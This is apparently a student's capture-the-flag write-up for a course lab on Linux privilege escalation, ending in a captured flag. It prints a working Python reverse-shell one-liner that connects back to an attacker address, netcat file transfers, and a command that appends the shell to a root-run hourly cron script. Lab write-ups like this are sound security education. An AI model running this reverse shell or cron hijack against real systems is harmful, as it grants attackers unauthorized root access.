flag{9f1f16}: Start DATATIME: Tuesday End DATATIME: Tuesday. Total time spend: 4h
First of all I started reading all the files published on canvas about privilege scalation and after a long time trying diferent
things I was not able no get into any direction that seemed reasonable so I needed to use the first hint. That one helped me a lot
to know how to start and in what direcction should I continue. So I started making the things the hint said me that were:
First of all downloading linuxprivchecker using wget:
wget https://raw.githubusercontent.com/swarley7/linuxprivchecker/master/linuxprivchecker.py
and then uploading linuxprivchecker.py with Netcat,opening a listener on Cuiteur to receive the file as on the previous exercice:
$ netcat -l -p 1337 > linuxprivchecker.py
Then, from the attacker machine, I uploaded linuxprivchecker.py:
$ netcat 10.0.2.186 1337 < linuxprivchecker.py
$ python linuxprivchecker.py
After that I spend another hour searching for new information until I realized I wasn't advancing and I used the secong hint. That 
hint told me to use linuxprivchecker to perform enumeration on the system and look for writeable files executed by root, as one 
common vulnerability is misconfigured read-write-execute (rwx) privileges.If a file regularly executed by root is writeable 
by non-root users, they can modify the file to execute their code with root privileges. So I realized that a page called 
cuiteur-cleaning was suspicious and start exploting that one using cron job. Then I made the following steps:
Into my own machine:
nano shell.sh
#!/bin/bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.6",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
nc -l -p 1338 < shell.sh
nc -nvlp 6666
Into the victime machine:
cd /var/www/html
nc 192.168.0.6 1338 > shell.sh
echo "/bin/bash /var/www/html/shell.sh" >> /etc/cron.hourly/cuiteur-cleaning
and waited for some minuts to get inside. After that I got a message that was:
job control turned off and finally made an ls to get the flag :)
